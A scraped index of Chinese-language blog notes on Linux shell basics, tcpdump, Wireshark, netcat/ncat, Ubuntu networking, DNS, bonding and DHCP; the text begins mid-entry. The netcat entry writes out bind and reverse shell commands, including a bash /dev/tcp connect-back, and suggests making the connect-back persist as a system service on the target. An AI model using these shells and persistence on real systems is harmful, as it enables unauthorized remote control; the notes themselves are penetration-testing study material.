coloe. \\e[0m\" echo -e \"\\e[1;45mThis is a red text background coloe. \\e[0m\" # printf 也是，不过是加了输出格式 10.切换用户 # 切换用户尽量加 - su - xxx # 加横线， shell的环境也跟随改变 （login shell） ； 执行的是前四个: bashrc和profile su xxx # 不加横线，当前环境还是当前的 () ； 执行的是两个bashrc文件 11.关于bash的文件 ## 关于bash的文件： # 系统级别 来到shell时候执行 /etc/profile /etc/bashrc # 用户级别 来到shell时候执行 ~/.bashrc ~/.","date":"2020-03-16","objectID":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:2:0","tags":["Linux","Shell"],"title":"Linux Shell基础知识","uri":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"实例 实践中再写….. ","date":"2020-03-16","objectID":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:3:0","tags":["Linux","Shell"],"title":"Linux Shell基础知识","uri":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"附 其他参考文章： https://blog.csdn.net/u011436427/article/details/103815680 https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ ","date":"2020-03-16","objectID":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/:4:0","tags":["Linux","Shell"],"title":"Linux Shell基础知识","uri":"/linux-shell%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"categories":["渗透测试"],"content":"工具-tcpdump使用 No_GUI的抓包分析工具 Linux、Unix系统默认安装 抓包 默认只抓68个字节 #参数: -i网卡 -s 抓包大小 -w保存到文件 tcpdump -i ens33 -s 0 -w file.pcap #抓取指定端口的流量 tcpdump -i ens33 port 22 读取抓包文件 #查看保存到文件中的数据包 tcpdump -r file.pcap #参数： -A 以ascii码形式显示内容 tcpdump -A -r file.pcap #参数： -X 以16进制形式显示内容 tcpdump -X -r file.pcap 显示筛选器 #利用OS自带的管道 #参数： -n 以ip地址显示，不显示域名； 显示第三列(ip+端口)并去重 tcpdump -n -r file.pcap | awk '{print $3}' | sort -u #tcpdump自身的显示筛选： 只显示源地址为这个的 tcpdump -n -src host 192.168.0.1 -r file.pcap #只显示目的地址为这个的 tcpdump -n -dst host 192.168.0.130 -r file.pcap #按端口号筛选 tcpdump -n port 53 -r file.pcap #显示udp的53端口 tcpdump -n udp port 53 -r file.pcap #显示tcp的 tcpdump -n tcp port 80 -r file.pcap #显示icmp的 tcpdump -n icmp -r file.pcap #显示ip的 tcpdump -n ip -r file.pcap #-X以16进制显示 tcpdump -nX port 80 -r file.pcap 高级筛选 TCP的包头： 可以看到上图中Flag中的标志位 tcpdump可以对如此细致的东西进行筛选 #只显示第13号字节中值转换为10进制为24(push+ack)的数据包 tcpdump -A -n 'tcp[13]24' -r file.cap PS: nc、Wireshark、tcpdump必须非常熟练地掌握 过程文档记录工具 介绍几个kali中自带的 1.Dradis 基于web的工具 短期临时小团队资源共享 各种插件导入文件（兼容很多种扫描器日志的导入） 使用： webapp 初始化后，输入密码即可登录 导入导出(支持不同文件格式)扫描器日志 （具体自己操作一下就知道了） 2.Keepnote 层级化记录信息： 不同项目可以使用不同文件夹，子文件 可以导出 3.Truecrypt 一款加密工具 2014年停止更新（官方原因是安全性不够，但实际使用却依然较安全） 选择加密区域： 1.创建加密文件（create volume） 2.创建卷(全盘加密) 选择加密方式 1.标准加密卷： 2.隐藏加密卷： 若被人强迫输入加密密码，可以输入一个密码打开后什么都没有(outer volume), 而重要信息存在一块隐藏空间(hidden volume)里面。hidden volume大小不能超过outer volume。【首先指定外部卷(迷惑别人的)的大小(尽量大一些,包括内部卷的大小)和密码, 内部机密卷存在于外部卷的空间中(设置它的大小和密码)】 选择加密算法（也可以多种加密算法叠加用） 设置密码 指定卷格式 生成随机key(用鼠标再屏幕上乱滑,划得月乱，key越复杂) 使用： 选择挂载的文件，就像挂载一块硬盘分区一样 使用完成后：dismount或dismount all就行 对于隐藏加密卷: 输入外部卷的密码就是外部卷的内容(存储大小也隐藏了另一部分)，输入内部卷的密码打开的就是内部卷的内容 ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-tcpdump%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95/:0:0","tags":["渗透测试","tcpdump"],"title":"工具 - tcpdump使用\u0026过程文档记录","uri":"/%E5%B7%A5%E5%85%B7-tcpdump%E4%BD%BF%E7%94%A8%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95/"},{"categories":["渗透测试"],"content":" Wireshark ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/:0:0","tags":["渗透测试","Wireshark"],"title":"工具 - Wireshark使用","uri":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"简介 抓包嗅探协议分析 安全专家必备技能 抓包引擎(wireshark本身是分析数据包, 抓包靠下面两个引擎) Linux上： Libpcap Windows上： Winpcap 解码能力（衡量抓包软件好坏的重要标准） ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/:1:0","tags":["渗透测试","Wireshark"],"title":"工具 - Wireshark使用","uri":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"基本使用方法 启动 捕获-\u003e选项-\u003e … … 选择抓包网卡 混杂模式 勾选上之后，如果数据包不是发送给我指定这个网卡的，也会被抓取 抓包筛选器 指定抓什么包，不抓什么包 实时抓包 就是主界面 保存和分析捕获文件 先停止，再保存(可以选择格式, 尽量使用.pcap格式)，压缩等, 下次可以导入已经抓取的数据包文件 首选项 编辑-\u003e首选项 -\u003e 可以自己根据需要修改和定制界面布局 筛选器 过滤干扰的数据包 抓包筛选器(捕获, 选项里面那个) 显示筛选器(主界面那个, 更多使用) – 常用语法 可以单独选择，也可以叠加(and, or)上面的条件进行筛选： ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/:2:0","tags":["渗透测试","Wireshark"],"title":"工具 - Wireshark使用","uri":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"常见协议数据包 数据包的分层结构显示 ARP IP Protocol字段： 表示上层是： udp–\u003e 17， tcp–\u003e 6, icmp –\u003e2, igmp –\u003e2 四层有好多中协议对应不同的数字 Header checksum字段：校验和, 每两位进行异或 tcp和udp一般不会有option字段（视情况而定） TCP 附： 三次握手 四次挥手 UDP udp和tcp的类似，自己实践能看懂 udp开销更小 DNS 应用层协议，基于udp HTTP ftp 这里没ftp服务器就先不放图了 ftp也是一个应用层协议 wishark默认是用端口区分协议(假设我们手动把http不开在80端口，wireshark分不清非标准端口的, 需要我们手动修改.如下图.) 数据流 比如访问一个网页, 往往产生很多数据包 wireshark提供了数据流 http smtp pop3 ssl 等 操作(以http为例)： 按照上图操作完后，会来到数据流的界面，如下： ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/:3:0","tags":["渗透测试","Wireshark"],"title":"工具 - Wireshark使用","uri":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"信息统计 1.查看导入数据包文件摘要信息 导入数据包文件，打开“统计”-\u003e“文件属性”：可以看到一些摘要性的信息 2.节点数 打开“统计”-\u003e“endpoint”： 可以以ip地址区分/udp有多少/二层的包头/其他标准区分 节点的个数等 Tx表示发送, Rx表示接收的数据包 3.协议分布 打开“统计”-\u003e“协议分级”：可以看到每个协议里面什么协议的占用百分比(DNS流量占用一般都很小,否则很有可能出现异常) 4.包大小分布 打开“统计”-\u003e“分组长度”：可以看到大包多还是小包多 5.会话连接 打开“统计”-\u003e“conversations”：可以看到哪两台机器之间数据包会话传送最多啥的 6.解码方式 对于非默认端口的数据包，wiresharl只会按端口区分的 右键, 手动decode为指定的协议， 这样wireshark就会按正确的协议来解析 需要熟悉不同协议数据包的内容, 防止手动解析错误 7.专家系统 “分析” -\u003e “专家系统”: 可能自动给我们一些提示 思路：如果很多个数据包，先从统计信息入手，分析出重点，找出方向。然后筛选出来，逐步分析包的内容 ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/:4:0","tags":["渗透测试","Wireshark"],"title":"工具 - Wireshark使用","uri":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"实践 抓包对比nc、ncta加密与不加密的流量 企业抓包部署方案 (Wiershark也有不足，大型网络还是需要商业化的软件) Sniffer Cace / riverbed （大部分还是基于wireshark进行了二次开发，改名了应该, 如果需要去网上找吧） Cascad pilot ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/:5:0","tags":["渗透测试","Wireshark"],"title":"工具 - Wireshark使用","uri":"/%E5%B7%A5%E5%85%B7-wireshark%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"netcat使用 ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/:0:0","tags":["渗透测试","nc"],"title":"工具 - netcat使用","uri":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"简介 侦听模式/传输模式 可以替代telent / 获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/:1:0","tags":["渗透测试","nc"],"title":"工具 - netcat使用","uri":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"基本用法 1. 实现telnet / banner # 题外话:追踪路由 mtr 114.114.114.114 ## nc作为客户端： # 参数 -v 显示详细信息 # 参数 -n 如果是域名,不进行域名解析(建议直接跟ip地址) nc -nv 1.1.1.1 110 # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令） nc -nv 1.1.1.1 25 # smtp服务器 nc -nv 1.1.1.1 80 # 探测80端口(都可进行交互的命令) 2.传输文本信息 # 可以做聊天用 # 一台作为服务端 -l 监听, -p 端口 nc -l -p 4444 # 另一台作为客户端去连接服务端 nc -nv 1.1.1.1 4444 用途： 远程电子取证 (原则:尽可能少修改被审计系统的状态，避免影响证据) 就可以用nc来操作: 我的电脑: nc -l -p 3333 监听 被审计系统:ls -l | nc -nv 1.1.1.1 3333 输出到我的电脑 我的电脑: nc -l -p 3333 \u003e ps.txt 输出结果重定向到文件 被审计系统:ps -ef | nc -nv 1.1.1.1 3333 -q 1 参数-q: 输出完成之后过1秒就断开 题外话：lsof 查看已经打开的文件 3.传输文件/目录 传输文件 # 客户端向服务端传输 （正向） A： nc-lp 3333 \u003e 1.mp4 B: nc -nv 1.1.1.1 3333 \u003c 1.mp4 -q 1 # 或者, 服务端向客户端传输文件 （反向） A: nc -q 1 -lp 3333 \u003c a.mp4 B: nc -nv 1.1.1.1 3333 \u003e 2.mp4 传输目录 # 正向(服务端先打包再传给客户端,注意小横线别遗漏) A: tar -cvf - music/ | nc -lp 3333 -q 1 B: nc -nv 1.1.1.1 3333 | tar -xvf - # 先接收再解包 加密传文件 A： nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb \u003e 1.mp4 # 接收，解密 B： mcrypt --fulsh -Fbq -a rijndael-256-m ecb \u003c a.mp4 | nc 1.1.1.1 3333 -q 1 # 加密，传送 # 需要输入加密秘钥，解密秘钥 # 不是nc的加密功能，是操作系统的加密命令，可以自行安装 4.流媒体 #把视频流输出到B端 A: cat 1.mp4 | nc -lp 3333 B: nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 - #接收视频流，输出给指定播放器和缓存进行播放 5.端口扫描 以客户端角色 #并非擅长端口扫描 #参数 -z 扫描参数，只判断是否开放（默认tcp） nc -nvz 1.1.1.1 1-65535 #参数 -u 扫描udp服务的端口 （不太准确） nc -nvzu 1.1.1.1 1-1024 6.远程克隆硬盘 远程电子取证，可以将目标服务器硬盘远程复制(块级别的备份,磁盘磁道的状态原原本本的复制)，或者内存(内存中运行的病毒进程) A: nc -lp 3333 | dd of=/dev/sda B: dd -if=/dev/sda | nc -nv 1.1.1.1 3333 -q 1 7.远程控制 参数: -c 正向： 目标机器作为服务端监听, 把bash传给我 A: nc -lp 3333 -c bash #目标机器 B: nc 1.1.1.1 3333 反向： 我的机器作为服务端, 让目标机器作为客户端主动连接我(客户端把bash传给服务器端) A: nc -lvp 3333 B: nc 1.1.1.1 3333 -c bash #目标机器 #假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell 目标机器： bash -i \u003e\u0026 /dev/tcp/192.168.41.133/2223 0\u003e\u00261 攻击方： nc -lvvp 2223 Note: Windows用户把bash改为cmd 反向连接用的多， 因为好多都限制进入的流量而不太多限制出去的流量(根据他允许的端口调整,比如dns) 长久维持会话： 写成脚本作为系统服务，让目标机器已启动就连接我 ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/:2:0","tags":["渗透测试","nc"],"title":"工具 - netcat使用","uri":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"ncat 命令 nc缺陷： nc缺乏加密能力：是数据是明文传输（容易被别人嗅探） 缺乏身份验证能力：端口如果一直向外开放，容易被他人连接窃取当做肉鸡 不同系统/平台的nc参数功能不尽相同（自己 -h 查看帮助文档和测试） ncat 命令 是包含在nmap工具包中里面的一个东西(弥补了nc缺乏加密和身份验证的不足) 正向连接： #先进行了秘钥交换和加密 #被控端(服务器端) -allow允许连接的ip， 端口, ssl加密 A: ncat -c bash -allow 192.168.1.20 -vnl 3333 --ssl B: ncat -nv 192.168.1.19 3333 --ssl #攻击端 ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/:3:0","tags":["渗透测试","nc"],"title":"工具 - netcat使用","uri":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/"},{"categories":["渗透测试"],"content":"其他 … … ","date":"2020-03-15","objectID":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/:4:0","tags":["渗透测试","nc"],"title":"工具 - netcat使用","uri":"/%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8/"},{"categories":["Linux"],"content":"网络原理 ping 127.0.0.1 如果能通，说明本机的TCP/IP协议已经配置成功啦 arping ","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:1:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"网卡配置 网卡接口 -enp2s0 (最近使用)、eth0 （以前这么使用） #wl 开头的是无线网卡 # ifconfig 命令 # 查看所有网卡 ifconfig -a 字段意义：MTU,发包，收包，`collisions`发生多少次冲突 # ip 命令 ip link # 查看所有网卡和信息 ip address # lshw 查看系统硬件命令 # 只查看网卡的命令 sudo lshw -class network 管理网卡 # 查看网卡参数 sud ethtool enp0s3 # -s 配置 ： speed 速度 半双工 sud ethtool -s duplex half | full speed 1000 网络基本设置 ## 临时设置IP地址 sudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0 # 24位掩码 sudo ifconfig eth0 10.0.0.100/24 # 设置网关 gw sudo route add default gw 10.0.0.1 eth0 # 网段路由 add-net （静态路由：去哪个网段，应该怎么转发） sudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1 # 主机路由 add-host sudo route add-host 2.2.2.2 gw 1.1.1.1 # 清除网卡配置 ip addr fulsh eth0 # 向网络中要一个IP sudo dhcpclient # 禁用网卡 sudo ifconfig eth0 down # 启用网卡 sudo ifconfig eth0 up # 重启网络服务 sudo systemctrl restart networking.service 网卡配置文件 /etc/network/interfaces 文件字段： iface 网卡name inet 网络配置（loopback/dhcp/static） sudo eth0 iface eth0 inet static|DHCP # pre-up 系统启动中(网卡运行前) 设置为1000M，全双工 pre-up/sbin/ethtool -s eth0 speed 1000 duplex full 动态获取IP地址 # sudo vim /etc/network/interfaces auto eth0 iface inet dhcp 静态IP地址 一般服务器是静态的IP # sudo vim /etc/network/interfaces auto eth0 iface inet static address 192.168.123.9 netmask 255.255.255.0 # 掩码 gateway 192.168.123.1 # 网关 dns-nameservers 192.168.123.1 202.99.96.68 # 一般dns地址写俩 # 上面是基本配置, 下面是额外其他配置项 broadcast 192.168.123.255 # 网段的广播地址 # dns-search abc.com # 如果属于某个dns域,就默认去找这个 up route add -net 172.16.0.0/24 gw 192.168.23.1 eth0 # 开机之后,添加一个网段(要指定具体网关) mtu 1460 # 指定MTU 字节 # hwaddress 00:11:22:33:44:55 # 指定硬件mac地址 # 刷新,重启网络, 配置文件的网络生效(实在不行就重启计算机) sudo ip address fulsh eth0 sudo systemctrl restart networking.service 指定路由 清除信息 ip addr flush ens32 Note： VmWare对网络的支持要好于VirtualBox(比如有些网络的配置可能有限制) Ubuntu 1804配置静态ip ubuntu18.04 server，启用了新的网络工具netplan，对于命令行配置网络参数跟之前的版本有比较大的差别，现在介绍如下： 其网络配置文件是放在/etc/netplan/50-cloud-init.yaml, 缺省是用dhcp方式，如果要配置静态地址，则需要修改此文件的想关内容，见如下的例子： network: version: 2 ethernets: ens33: addresses: [192.168.1.20/24] # 可以是这种数组形式[1.1.1.1, 192.168.1.20/24]也可以是下面那样 dhcp4: false gateway4: 192.168.1.1 nameservers: addresses: [192.168.1.1] optional: true 或者下面这个格式(可能更清晰，有ipv6) # the datasource. Changes to it will not persist across an instance. # To disable cloud-init's network configuration capabilities, write a file # /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following: # network: {config: disabled} # 前几项必填，其他根据需要填写 network: version: 2 ethernets: eth0: addresses: - 公共ipv4地址/20掩码 - 私有ipv4地址/16 - 公共ipv6地址/64 dhcp4: false gateway4: \"公共ipv4网关\" gateway6: 公共ipv6网关 match: macaddress: MAC地址(不必须) nameservers: # DNS addresses: - \"67.207.67.2\" - \"67.207.67.3\" set-name: eth0 2.使其生效的方法： sudo netplan apply 如果配置有问题会报错，如果没问题，则会新的配置会立即生效。 注意：此方法只是针对ubuntu18.04 Server版，对于18.04 desktop它缺省是使用NetworkManger来进行管理，可使用图形界面进行配置，其网络配置文件是保存在：/etc/NetworkManager/system-connections目录下的，跟Server版区别还是比较大的。 netplan 工具还有其它比较丰富的功能，详细可参见其的说明文档。 ","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:2:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"DNS配置 DNS配置文件 /etc/resolve.conf /etc/resolve.conf # DNS设置（软连接） 格式: nameserver 114.114.114.114 nameserver 127.0.0.53 options edns0 search www.tendawifi.com 主机名解析 1.配置文件 /etc/hosts 优先级别高于resolve.conf里面的dns服务器的信息 # ip 和名称做解析 127.0.0.1 localhost 192.168.0.111 www.qq.com # 现在这里找映射，有的话就不去resolve里面找了 2.配置文件 /etc/nsswitch.conf 名称解析顺序配置文件 # 按照优先级先后排序来解析 （前面的不满足，才调用后面的） - files /etc/hosts - Resolve 全称systemd-resolved.service(缓存、localhost、本机名) （默认安装） - [NOTFOUND=return] 结果即权威 （正则表达式） （当找不给我到的之后，返回） - dns dns服务器（resolve文件配置的那些） - mdns4_minimal MulticastDNS(多播dns服务) 现在很多dns厂家用的就是多播dns服务 # hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname 关于解析优先级：有的攻击者会修改你hosts文件映射到自己的恶意网址，此时如果把dns的顺序放到hosts前面，他就利用不成了 查看路由 # 路由信息 route -n netstat -nr ","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:3:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"网桥配置 把服务器当交换机用实在是大材小用 把多个以太网段以上层透明的方式连接在一起 **应用场景： ** 1.可做防火墙 2.可以做虚拟机的服务器（搭建云平台，进行虚拟化的时候） 3.桥接有线网与无线网（比如我的笔记本：连接网线访问互联网，另外让别人通过我的电脑无线上网，相当于一个AP） 4.链路荣誉容错（需启用STP） 5.通过网桥管理工具实现 bridge-utils 在ubunut搭建网桥 在虚拟机添加2块网卡(一块NAT，另一块随便) **安装网桥管理包： ** sudo apt install bridge-utils **临时配置网桥： ** 命令： btctl sudo btctl addr br0 # 添加一个网桥的网卡接口 sudo btctl addif br0 eth0 eth1 # 往网桥接口添加2块网卡 # sudo ifconfig eth0 down # 把网卡down掉 sudo ifconfig eth0 0.0.0.0 up # 2者的ip变没了 sudo ifconfig eth1 0.0.0.0 up sudo ifconfig br0 1.1.1.1/24 up # 手动配置网桥网卡的ip并up sudo dhclient br0 # 或者 dhcp自动获取网桥网卡的ip地址 sudo route add default gw 1.1.1.10 # 添加一个网关，就可以访问外网了 持久配置网桥： 修改配置文件： /etc/network/interfaces auto eth0 iface eth0 inet manual auto eth1 iface eth1 inet manual auto br0 iface br0 inet dhcp # dncp ， 也可以static，下面手动配置address，netmask和gateway bridge_ports eth0 eth1 # 加入网卡 bridge_stop off #关闭生成树 ,也可以 on开启成树，参与生成树计算 修改保存，然后 重启网络服务/重启服务器 **查看网桥运行状态 ** sudo brctl show 查看mac情况 sudo brctl showmacs br0 查看生成树情况 sudo brctl showstp br0 ","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:4:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"网卡绑定 (经常使用) 还记得小时候这段一把筷子的故事吗 实现多块网卡的绑定，实现高可用、负载均衡、更大发挥能力 一些常用称呼： Bonding == Port Trunking == Link aggregation(链路聚合) == Team 目的： 将多个物理网卡组合为一个逻辑网卡 高可用、负载平衡、高吞吐量 配置： 在虚拟机做实验：先给虚拟机添加至少两块网卡 1.第一步 sudo echo bonding \u003e\u003e /etc/modules # 添加内核支持 sudo modprobe bonding # 手动加载内核(临时)， modeprobe加载bonding ifconfig -a # 可以看到自动生成了一个bonding0的网卡(但是没有up) sudo systemctl stop networking # 永久配置，文件 # sudo vim /etc/network/interfaces bounding # 添加一个模块 # 重启服务 sudo systemctl restart networking 2.配置网卡配置文件 # Mode 1 配置 # sudo vim /etc/network/interfaces auto eth0 iface eth0 inet manual bond-master bond0 # 绑定到哪个bound上 bond-primary eth0 # 默认做的主的网卡 auto eth01 iface eth01 inet manual bond-master bond0 # 备的网卡，协商要绑定那个 auto bond0 iface bond0 inet dhcp # 让ip地址dhcp； 或者static 手动制定 bond-mode 1 # 绑定模式 active-backup bond-miimon 100 # 故障检测间隔： 100ms bond-slaves none # 指定作为的的成员的网卡, 这里写none是因为：加入在自己物理网卡片段里面写了 -- # 重启服务 sudo systemctl restart networking PS: 绑定模式 bound-mode 1 一个主，一个备(主的故障后才工作) 也叫： active-backup 6种模式 Mode 0 ： round-robin(轮询) 网络流量（数据包） 顺序平均分配给Bond中所有物理网卡（可以同时使用三个网卡发送和接收数据） 高可用（容错，一个坏了，另一个网卡接管）、负载均衡（多个网卡，单独是，就是拥有了多G的带宽） Mode 1 : ative-backup Bond中只有一个网卡Active， 其他网卡全部Stanby（效率并不是很高） 对外只有一个网卡的MAC地址可见 高可用 实现不了负载均衡，有多个接口也没用 Mode 2: balance-XOR 根据源目的MAC/IP/Port进行计算，确定从哪个网卡发出（性能优于Mode0） 高可用，负载均衡 （XOR — \u003e 异或） 只要不出现故障，不改变mac地址，第一次使用的第一个物理网卡进行的通信，以后所有的通信都是继续使用第一个物理网卡 流量不是平均的 Mode 3 broadcast 发包广播给Bond中所有网卡，提供最短的故障恢复时间，应用连接不中断 高可用 Mode 4 802.3ad（Dynamic link aggregation） 链路聚合LACP组内的网卡使用相同速率、双工设置 要求：计算机安装ethtool；交换机支持IEEE802.3ad标准，并进行额外配置 高可用、负载均衡 Mode 5 balance-tlb （Adaptive transmit load balancing） 隧道绑定不需要上连交换机额外配置，根据网卡负载出站负载均衡 高可用、负载均衡 Mode 6: balance-alb (Adaptive load balance) Mode 5 + balance-rlb (入站流量负载均衡) Bond驱动拦截本机的ARP响应包，使用不同网卡硬件MAC替换源MAC 不同的对端使用不同的服务器MAC地址，实现入站负载均衡 不需要上连交换机额外配置 查看bond端口和状态 cat /proc/net/bonding/bond0 Model 4 配置 # sudo vim /etc/network/interfaces auto eth0 # 其他物理网卡配置项同 iface eth0 inet manual bond-master boud0 # 绑定到哪个bound上 auto bon d0 iface bond0 inet dhcp # 让ip地址dhcp； 或者static 手动制定 bond-mode 4 # 绑定模式 active-backup bond-miimon 100 # 故障检测间隔： 100ms bond-lacp-rate 1 # 每1s发送LACPDU（默认为0，即30s） bond-slaves eth0 eth1 # 指定作为的的成员的网卡 ","date":"2020-03-08","objectID":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/:5:0","tags":["Linux","ubuntu"],"title":"ubuntu server-网络相关知识","uri":"/ubuntu-server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86/"},{"categories":["Linux"],"content":"DHCP服务 通常给客户端自动分配IP地址 Dynamic Host Configuration Protocol 透明的配置网络参数 IP/掩码、网关、DNS、域名、时间服务器、打印服务器(常用的参数是前三个) 通过地址租约循环使用IP地址（有租约期，循环利用） 基于UDP， 标准使用 端口： 67(服务端)，68(客户端) ps: 一般企业，dhcp都在核心交换机上，只有当企业网络非常大复杂时候，才会单独使用一个服务器来提供dhcp服务 **请求和分配步骤： ** 1.客户端发生第一个广播(二层，因为此时还没有ip)，数据包：dhcp discover 2.dhcp服务器回复数据包dhcp offer 3.客户端就再发一个广播包dhcp request 4.服务器端发送数据包ack， 包含ip等参数，标记这个ip为已分配 安装 1.在vmware上，打开虚拟网络设置，以vmnet8为例，关闭vmware自带的dhcp服务（如果同时有两台dhcp服务:使用响应快的服务提供的ip），将这台虚拟机使用nat， 让其他虚拟机都使用这台虚拟机的dhcp服务，把这个虚拟机修改为静态ip, 修改配置文件/etc/network/inertface到vmnet8的网段，sudo ip addr fulsh eth0清除原来配置，重启网络服务 2.安装dhcp服务的软件包 # 这里用的isc的 sudo apt install isc-dhcp-server 3.配置dhcp服务 Note：能不安装的服务和软件就不要安装，反非必须，就不启用（缩小攻击面） ##1.先修改配置文件1 #sudo vim /etc/default/isc-dhcp-server # 指定启动DHCP服务的网卡 INTERFACE=\"eth0\" # 要启动shcp的网卡name(一般是针对内网的那一块网卡)，可以多个网卡（空格隔开） ##2.再修改主配置文件（指定地址池和选项） #sudo vim /etc/dhcp/dhcpd.conf #option只对dhcp的作用域起效；其他的很对整个服务器起效 #一致的配置写在文件起始位置，其他的个性的单独设置在各个网段的位置 default-lease-time 600; #租约期限， 单位：s max-lease-time 7200; #最大租约期限(到达时间的一半，就刷新使用期；如果到达最大时间，就重新通过dhcp获取) authoritative; #启用之后，证明这个是权威的授权dhcp服务器（一般情况下，网络中如果出现其他的dhcp就不会影响了） #配置地址池(可以手动写，也可以在原注释的基础上配置) 网段 subnet 10.1.8.0 netmask 255.255.255.0 { range 10.1.8.100 10.1.8.200; #可分配的地址段 option routers 10.1.8.1; #网关地址 option domain-name-servers 192.168.1.1,192.168.1.2; #dns服务器地址，多个用逗号隔开; 一般配到这里就够了 option ntp-server 1.1.1.1; #时间服务器 option domain-name \"local.lan\"; #统一的域名 } ##3.重启服务 #客户端一些操作 ipconfig /all ipconfig /release # 释放这个ip ipconfig /renew #重新获取ip 3.特殊情况(指定某个ip只分配给某台计算机，IP保留) 通过MAC地址来识别 #sudo vim /etc/dhcp/dhcpd.conf host yourname { hardware ethernet 00:11:22:33:44:55; fixed-address 10.1.8.8; #尽量用上面地址池以外的地址 } #保存，重启 日常的维护 日志与状态查询 #服务器地址租约结果（可查看分发详细信息） cat /var/lib/dhcp/dhcpd.leases #系统日志文件(客户端直接关机不会记录，release的时候会记录) tail -f /var/log/syslog #查看服务运行状态 systemctl status isc-dhcp-server.service #客户端来查看获得地址历史(客户端是Linux时) less /var/lib/dhcp/dhcpd.leases ​ 